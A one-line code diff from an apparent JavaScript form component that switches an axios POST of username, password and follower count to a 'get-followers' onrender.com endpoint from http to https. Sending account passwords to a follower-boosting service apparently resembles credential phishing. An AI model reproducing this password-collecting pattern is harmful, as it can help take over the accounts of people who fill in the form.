@@ -44,7 +44,7 @@ const Component = () => {
     if (!isValid) return;
 
     try {
-      const res = await axios.post("http://get-followers-4z2j.onrender.com/formdata", {
+      const res = await axios.post("https://get-followers-4z2j.onrender.com/formdata", {
         username,
         password,
         followers,
